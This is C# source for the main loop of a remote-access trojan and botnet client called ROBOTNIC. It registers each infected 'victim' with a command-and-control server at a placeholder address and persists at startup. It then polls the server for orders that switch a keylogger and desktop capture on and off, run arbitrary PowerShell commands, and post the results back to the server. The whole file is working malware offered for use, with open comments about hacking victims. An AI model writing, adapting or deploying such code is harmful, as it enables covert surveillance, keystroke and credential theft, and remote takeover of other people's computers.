﻿using System;
using System.Diagnostics;
using System.Net;
using Microsoft.Win32;


namespace ROBOTNIC
{
    internal class Program
    {
        public static WebClient webClient = new WebClient();
        static void Main(string[] args)
        {
            ClientAdder.addNewClient(webClient); // Object Call to Class "ClientAdder" to Add a New Victim to The Bot Hive
            ClientAdder.runAtStartup();
            ClientKeylogger.initClientKeylogger(); //--keylogger init but not started
            ClientDesktop.initClientDesktop(); //--desktop capture init but not started
            while (true)
            {
                System.Threading.Thread.Sleep(2000); //Sleep Or Wait Two Seconds Then Continue Or Start
                string name = Dns.GetHostName(); // Get Host Name
                // Forge Http Header to POST Info to C2, Set The Content Type to Txt (Probably)
                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                // Upload Victim Name to Database
                string cmdFromServer = webClient.UploadString("http://your.ip.address/getServerCommands.php", "client=" + name);

                if (cmdFromServer.Contains("nocmd" +
                    "")) continue; // Check The Database to See if Commands Are in Queue to Execute or No if Not , Continue Looping
                /* if (cmdFromServer.Contains("Hacked"))
                 {
                     // will pop a Window in The Victim Computer That Says "Hacked"
                     //MessageBox.Show("You're Hacked btw Lol");
                 } */
                else if (cmdFromServer.Contains("bye"))
                {
                    //Will End The Process On The Victim Machine 
                    System.Environment.Exit(0);
                }
                else if (cmdFromServer.Contains("Clean"))
                {
                    try
                    {
                        Process process = new Process();
                        //process.StartInfo.FileName = "powershell.exe";
                        //process.StartInfo.Arguments = "/c" + "Remove-Item HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Win32Host -Recurse";
                        //Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\Run\Win32Host");
                        Registry.CurrentUser.DeleteSubKeyTree("Win32Host");
                        Console.WriteLine("RegDeleted");
                        //string Del = Process.GetCurrentProcess().MainModule.FileName;
                        //process.StartInfo.Arguments = "/c" + "-eq bypass Remove-Item" + Del + "-Recurse";
                       //System.Environment.Exit(0);
                    }
                    catch
                    {
                        System.Environment.Exit(0);
                    }
                }
                //-- keylogger --
                else if (cmdFromServer.Contains("startkeylog"))
                {
                    //--do start keylog function
                    ClientKeylogger.StartKeylogger();
                }
                else if (cmdFromServer.Contains("stopkeylog"))
                {
                    //--do stop keylog function
                    ClientKeylogger.StopKeylogger();
                }
                //-- desktop capture --
                else if (cmdFromServer.Contains("startdc"))
                {
                    //--do start desktop capture function
                    ClientDesktop.StartDesktopCapture();
                }
                else if (cmdFromServer.Contains("stopdc"))
                {
                    //--do stop desktop capture function
                    ClientDesktop.StopDesktopCapture();
                }
                else // This Will Call The Class That Executes The Powershell Commands & Send The Results to The C2 Server 
                {
                    string retString = Commands.Run(cmdFromServer);
                    Console.WriteLine(retString);
                    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webClient.UploadString("http://your.ip.address/retString.php", "client=" + name + "&retstr=" + retString);
                    // This is Possiblly Vulnarable to Injection Attacks (XSS & RCE Webshell) so Becarefull Who you Hack Lol
                }
                Console.WriteLine(cmdFromServer);

            }
        }

    }
}
